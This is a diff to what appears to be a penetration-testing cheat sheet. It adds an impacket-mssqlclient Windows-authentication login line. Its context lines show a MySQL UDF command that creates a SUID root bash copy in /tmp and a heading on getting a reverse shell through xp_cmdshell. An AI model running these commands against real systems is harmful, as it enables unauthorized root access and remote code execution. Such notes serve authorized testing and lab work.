@@ -401,6 +401,9 @@ mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
 ```
 impacket-mssqlclient user:password@10.11.10.10
 ```
+Windows:
+```
+impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth
 ## Reverse shell using xp_cmdshell
 ```
 enable_xp_cmdshell
